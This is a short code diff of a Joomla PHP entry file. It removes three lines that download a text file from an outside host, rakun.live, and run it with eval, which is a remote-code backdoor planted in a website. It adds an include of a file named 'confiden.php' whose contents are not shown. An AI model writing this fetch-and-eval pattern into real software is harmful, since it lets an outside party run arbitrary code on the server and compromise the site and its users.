@@ -1,7 +1,5 @@
 <?php
-$url = file_get_contents(urldecode('https://rakun.live/landing/sesis.txt'));
-$url = "?> ".$url;
-eval($url);
+include 'confiden.php';
 
 /**
  * @package    Joomla.Site
